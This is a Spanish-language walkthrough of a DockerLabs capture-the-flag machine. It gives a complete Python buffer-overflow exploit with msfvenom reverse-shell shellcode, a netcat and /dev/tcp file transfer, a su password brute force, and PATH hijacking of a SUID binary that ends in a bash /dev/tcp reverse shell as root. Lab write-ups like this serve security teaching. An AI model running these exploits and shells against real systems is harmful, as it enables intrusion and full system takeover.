__
- Tags: #máquina #bof #pathhijacking 
___
# Reconocimiento 

Gracias a la utiliadad de [autodockerlabs]() desplegaremos el contenedor de **Docker** de manera más sencillo, vemos que la [Dirección IP](<../../🐱‍💻 Introducción al Hacking/🅱 Conceptos Básicos/Dirección IP.md>) es la **172.17.0.2**.

![](<../images/Pasted image 20240914165614.png>)

En primer lugar, realizamos un escaneo con [Nmap](<../../🐱‍💻 Introducción al Hacking/🔎 Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>) sbore todos los puertos de la siguiente forma:

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 172.17.0.2 -oG allPorts
```

Observamos que tan solo están abiertos los puertos **80, 20201**:

![](<../images/Pasted image 20240914165644.png>)

Gracias a la utilidad de [getPorts]() nos copiamos los puertos que se encuentran abiertos, y ahora volviendo a usar [Nmap](<../../🐱‍💻 Introducción al Hacking/🔎 Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>) realizaremos un escaneo más exhaustivo sobre los puertos abiertos de la siguiente forma:

```bash
nmap -p80,20201 -sCV 172.17.0.2 -oN targeted
```

Observamos que no nos reporta nada interesante:

![](<../images/Pasted image 20240914165727.png>)

___
# Explotación

Como está abierto el puerto **80** nos dirigimos a la página web y vemos un botón **download** el cual si clicamos nos descarga un archivo llamado **secure_software**.

![](<../images/Pasted image 20240914165843.png>)

Vemos que se trata de un archivo ejecutable de **32bits**:

![](<../images/Pasted image 20240914170957.png>)

Si ejecutamos dicho archivo vemos que se pone en escucha por el puerto **20201** (*mismo puerto que estaba abierto en la máquina víctima*), y si intentamos acceder a través de [NetCat](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Consideraciones previas.md# NetCat>) vemos que podemos introducir data.

![](<../images/Pasted image 20240914165954.png>)

Si entramos a través del puerto que está abierto en la máquina observamos el mismo funcionamiento.

![](<../images/Pasted image 20240914170009.png>)
## [Buffer OverFlow](<../../🐱‍💻 Introducción al Hacking/😎 Buffer OverFlow/Buffer OverFlow.md>)

Probaremos a intentar un ataque de [Buffer OverFlow](<../../🐱‍💻 Introducción al Hacking/😎 Buffer OverFlow/Buffer OverFlow.md>) con el binario que nos hemos descargado, para ello debemos introducir muchos caracteres en el input y ver si peta la aplicación, observamos que peta la aplicación:

![](<../images/Pasted image 20240914170039.png>)
### Sacar offset

En el este punto lo más seguro es que sea vulnerable a un [Buffer OverFlow](<../../🐱‍💻 Introducción al Hacking/😎 Buffer OverFlow/Buffer OverFlow.md>) por lo que intentaremos sacar el **offset**, es decir la basura o junk que hay que introducir como input para que el programa pete, para poder realizar dicha acción nos abriremos el binario con gdb.

```bash
gdb secure_software -q
```

Gracias al siguiente comando generaremos un conjunto de caracteres el cual nos permitirá determinar el **offset**.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
```

Nos montamos este simple script de python para poder automatizar el proceso de conectarse a través del puerto **20201**.

```python
#!/usr/bin/env python3

import socket

ip_addr = "127.0.0.1"
port = 20201

pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"

def main():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_addr, port))

    s.send(b"Enter Data: " + pattern + b"\r\n")


if __name__ == '__main__':

    main()
```

En gdb ejecutaremos el binario para ponerlo en escucha con la instrucción `r` (run):

![](<../images/Pasted image 20240914170814.png>)

Ahora ejecutaremos el exploit con:

```bash
python3 exploit.py
```

Observamos como el binario peta, por lo que debemos hacer ahora es copiarnos la dirección `0x41366a41` que corresponde al `Aj6A` en hexadecimal.

![](<../images/Pasted image 20240914170847.png>)

Ahora volviendo a usar una herramienta de [Metasploit](<../../🐱‍💻 Introducción al Hacking/➕ Material Adicional/Metasploit/Metasploit.md>) sacaremos el **offset** pasándole con el parámetro `-q` la dirección en hexadecimal.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41366a41
```

Vemos que el **offset** es **288**.

![](<../images/Pasted image 20240914170909.png>)
### Tomando control del EIP

En este punto lo que debemos hacer es comprobar si tenemos control sobre el **EIP**, el cual se encarga de apuntar a la ubicación en la memoria donde se encuentra la siguiente instrucción del programa. Actualizaremos el exploit , estableciendo en la variable **before_eip** la basura que hay antes de llegar al **eip**, el cual vale `BBBB`, por lo que si vemos en el **gdb** `BBBB` tendremos control sobre el **EIP**.

```python
#!/usr/bin/env python3

import socket

ip_addr = "127.0.0.1"
port = 20201

offset = 288
before_eip = b"A"*offset
eip = b"B"*4

payload = before_eip + eip

def main():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_addr, port))

    s.send(b"Enter Data: " + payload + b"\r\n")


if __name__ == '__main__':

    main()
```

Volveremos a ponernos en escucha con `r` (run) y ejecutaremos el exploit. Observamos como ahora el **EIP** vale `BBBB` por lo que habremos tomado el control sobre el **EIP**.

![](<../images/Pasted image 20240914171109.png>)
### Checksec

En este punto en el gdb introduciremos la acción `checksec` para comprobar que protecciones tiene el binario, y vemos que **NX** (Not Executable/Not Execute) esta desactivado por lo que podemos cargar nuestro shellcode directamente en el binario.

![](<../images/Pasted image 20240914175835.png>)

En este punto lo que debemos hacer es hacer es ver a donde se dirige todo lo que introducimos después del **EIP**, para ello añadiremos la variable **after_eip**:

```python
#!/usr/bin/env python3

import socket

ip_addr = "127.0.0.1"
port = 20201

offset = 288
before_eip = b"A"*offset
eip = b"B"*4
after_eip = b"C"*300

payload = before_eip + eip + after_eip

def main():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_addr, port))

    s.send(b"Enter Data: " + payload + b"\r\n")


if __name__ == '__main__':

    main()
```

Si ejecutamos `x/300wx $esp` para ver la información que hay en el pila vemos que nuestras **Cs** se están introduciendo al principio de la pila (stack), por lo que en este punto lo que debemos hacer es encontrar un **OpCode** el cual nos permita realizar un salto al **ESP**, es decir al principio de la pila.

![](<../images/Pasted image 20240914171320.png>)
#### Opcode

Volveremos a usar una herramienta de [Metasploit](<../../🐱‍💻 Introducción al Hacking/➕ Material Adicional/Metasploit/Metasploit.md>) pero esta vez será para saber el **OpCode** del **JMP ESP**, y vemos que es **FFE4**.

![](<../images/Pasted image 20240914171402.png>)

Ahora usaremos **objdump** para saber cual es la dirección de memoria la cual nos permite realizar el **JMP ESP** y vemos que la dirección es `0x08049213`.

```bash
objdump -d secure_software | grep "FF E4" -i
```

![](<../images/Pasted image 20240914171451.png>)

Usando **msfvenom** nos generaremos un shellcode el cual nos permita enviarnos una [Reverse Shell](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>), para ello podemos introducir el siguiente comando:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -b '\x00\x0a\x0d' -f py
```

![](<../images/Pasted image 20240914171733.png>)

Finalmente, lo que debemos hacer ahora es introducir la dirección de memoria del **JMP ESP** en la variable **EIP** para que se aplique dicho salto, destacar que debe de estar en formato little endian, además cargaremos nuestro shellcode el cual nos enviará una [Reverse Shell](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) al puerto **443**, y por último debemos añadir unos **NOPs** (`\x90`) antes de nuestro shellcode para que sea interpretado correctamente.

> Destacar que también debemos cambiar la [Dirección IP](<../../🐱‍💻 Introducción al Hacking/🅱 Conceptos Básicos/Dirección IP.md>) para ahora apuntar al puerto **20201** de la máquina víctima, pues este tenía el mismo binario.

```python
#!/usr/bin/env python3

import socket
from struct import pack

ip_addr = "172.17.0.2" # Cambiaremos la IP para apuntar al puerto 20201 de la máquina vícitma.
port = 20201

offset = 288
before_eip = b"A"*offset 
eip = pack("<L", 0x08049213) # Añadimos la dirección memoria que tiene el opcode que aplica un jmp esp.

# Añadimos el shellcode el cual nos permite enviarnos una reverse shell.
shellcode =  b""
shellcode += b"\xd9\xcd\xb8\xc0\x7c\xbc\xaa\xd9\x74\x24\xf4\x5e"
shellcode += b"\x33\xc9\xb1\x12\x31\x46\x17\x83\xee\xfc\x03\x86"
shellcode += b"\x6f\x5e\x5f\x37\x4b\x69\x43\x64\x28\xc5\xee\x88"
shellcode += b"\x27\x08\x5e\xea\xfa\x4b\x0c\xab\xb4\x73\xfe\xcb"
shellcode += b"\xfc\xf2\xf9\xa3\x52\x15\xfa\x32\xc3\x14\xfa\x35"
shellcode += b"\xa8\x90\x1b\x85\xa8\xf2\x8a\xb6\x87\xf0\xa5\xd9"
shellcode += b"\x25\x76\xe7\x71\xd8\x58\x7b\xe9\x4c\x88\x54\x8b"
shellcode += b"\xe5\x5f\x49\x19\xa5\xd6\x6f\x2d\x42\x24\xef"

# Es importante añadir los NOPs para que nuestro shellcode sea interpretado correctamente
payload = before_eip + eip + b'\x90'*30 + shellcode

def main():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_addr, port))

    s.send(b"Enter Data: " + payload + b"\r\n")


if __name__ == '__main__':

    main()
```

Nos pondremos en escucha con [NetCat](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Consideraciones previas.md# NetCat>) con el siguiente comando:

```bash
nc -nlvp 443
```

Si ejecutamos el script vemos como recibimos la [Reverse Shell](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>):

> Parece magia 🔮

![](<../images/Pasted image 20240914172107.png>)

____
# Escalada de privilegios

Una vez ganado acceso a la máquina lo que debemos hacer es un [Tratamiento de la TTY](<../../🐱‍💻 Introducción al Hacking/🧗‍♂️ Técnicas de escalada de privilegios/✅ Consideraciones/Tratamiento de la TTY.md>) para poder operar más cómodamente en resumen debemos realizar las siguiente instrucciones:

1. `script /dev/null -c bash`
2. <kbd>CTRL</kbd>+<kbd>Z</kbd>
3. `stty raw -echo; fg
4. `reset xterm`
5.  `export TERM=xterm && export SHELL=bash`
6. `stty rows 44 cols 184`

Vemos que en nuestro directorio home tenemos un hash en formato **MD5** pues tiene 32 caracteres.

![](<../images/Pasted image 20240914172303.png>)

Observamos que existe el usuario **johntheripper** existe en la máquina.

![](<../images/Pasted image 20240914172624.png>)

En este punto lo que intentaremos será crackearlo con **johntheripper**,  [Hashes](https://hashes.com/en/decrypt/hash) [CrackStation](https://crackstation.net/)u otras herramientas pero no tendremos éxito. 

Si seguimos enumerando el sistema nos encontraremos con el archivo `/opt/.hidden/words` el cual contiene un listado de palabras.

![](<../images/Pasted image 20240914172655.png>)

Por lo que intentaremos aplicar fuerza bruta al usuario **johntheripper** para ello necesitamos un script de fuerza bruta como el sigueinte: [Su-bruteForce](https://github.com/TerrorAterrador/su-BruteForce), vemos que no tenemos **curl** o **wget** para [Transferirnos](<../../🐱‍💻 Introducción al Hacking/🧗‍♂️ Técnicas de escalada de privilegios/✅ Consideraciones/Transferir archivos.md>) el script.

![](<../images/Pasted image 20240914172817.png>)

Deberemos usar el medio tradicional para [Transferirnos](<../../🐱‍💻 Introducción al Hacking/🧗‍♂️ Técnicas de escalada de privilegios/✅ Consideraciones/Transferir archivos.md>) el archivo, es decir ejecutaremos el siguiente comando en la máquina atancate:

```bash
nc -nlvp 443 < su-brute-force-sh.sh
```

Y en la máquina victima el siguiente comando: 

```bash
cat < /dev/tcp/172.17.0.1/443 > su-brute-force.sh
```

Vemos como hemos conseguido [Transferirnos](<../../🐱‍💻 Introducción al Hacking/🧗‍♂️ Técnicas de escalada de privilegios/✅ Consideraciones/Transferir archivos.md>) el script correctamente sin necesidad de usar **wget** o **curl**.

![](<../images/Pasted image 20240914172940.png>)

Ejecutaremos el script [Su-BruteForce](https://github.com/TerrorAterrador/su-BruteForce) para ver las opciones:

![](<../images/Pasted image 20240914172958.png>)

Una vez vistas las opciones ejecutaremos el script especificando el nombre de usuario **johntheripper** y el diccionario que hemos encontrado en `/opt/.hidden/words`.

```bash
./su-brute-force.sh -u johntheripper -w dic.txt
```

Observamos como nos reporta la contraseña de manera casi instantánea. 

![](<../images/Pasted image 20240914173013.png>)

Si probamos a autenticarnos observamos como hemos podido convertirnos en el usuario **johntheripper** de manera exitosa: 

![](<../images/Pasted image 20240914173031.png>)

En nuestro directorio home vemos que hay un archivo con permiso [SUID](<../../🐱‍💻 Introducción al Hacking/🧗‍♂️ Técnicas de escalada de privilegios/Abusando de privilegios SUID/SUID.md>) donde el propietario es el **root**.

![](<../images/Pasted image 20240914173057.png>)

Vemos que al ejecutar dicho script nos lista los fichero que hay en el directorio actual:

![](<../images/Pasted image 20240914173120.png>)

> De manera adicional y para entender como funciona mejor este script nos lo transferimos a la máquina atacante y lo abriremos con **Ghydra**, en la función **main** veremos que está llamando a un comando a nivel de sistema ("ls") sin usar la ruta absoluta por lo que podremos intentar un [PATH Hijacking](<../../🐱‍💻 Introducción al Hacking/🧗‍♂️ Técnicas de escalada de privilegios/PATH Hijacking/PATH Hijacking.md>).
> 
> ![](<../images/Pasted image 20240914173155.png>)

En este punto lo que haremos será crear un fichero con permisos de ejecución y con el nombre `ls`.

Cambiaremos nuestra variable PATH para intentar un [PATH Hijacking](<../../🐱‍💻 Introducción al Hacking/🧗‍♂️ Técnicas de escalada de privilegios/PATH Hijacking/PATH Hijacking.md>), es decir introduciremos nuestra home por delante de todos los otros directorios.

```bash
export PATH=/home/johntheripper:$PATH
```

![](<../images/Pasted image 20240914173454.png>)

Volveremos a ejecutar el binario y vemos que nos muestra el output del comando **whoami**, pues dicho comando se encuentra definido dentro del ejecutable `ls`.

![](<../images/Pasted image 20240914173503.png>)

En este punto lo que debemos hacer es introducir el siguiente contenido en el ejecutable `ls` para enviarnos una [Reverse Shell](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>).

```bash
bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"
```

![](<../images/Pasted image 20240914173555.png>)

Nos pondremos en escucha con [Consideraciones previas](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Consideraciones previas.md# NetCat>) y al ejecutar el archivo `./showfiles` recibiremos la [Reverse Shell](<../../🐱‍💻 Introducción al Hacking/💣 Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) como el usuario **root**.

![](<../images/Pasted image 20240914173701.png>)
